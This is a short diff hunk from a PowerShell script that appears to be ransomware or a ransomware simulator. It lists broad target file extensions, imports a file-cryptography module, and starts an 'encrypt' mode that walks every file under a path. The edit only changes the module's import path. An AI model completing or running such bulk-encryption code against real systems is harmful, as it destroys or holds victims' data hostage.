@@ -37,7 +37,7 @@ param([string]$Mode,
 $TargetFiles = '*.exe*','*.dll*','*.iso*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'
 
 # Import FileCryptography module
-Import-Module "$PSScriptRoot\FileCryptography.psm1"
+Import-Module "C:\Temp\FileCryptography.psm1"
 
 if ($mode -eq "encrypt") {
     # Gather all files from the target path and its subdirectories
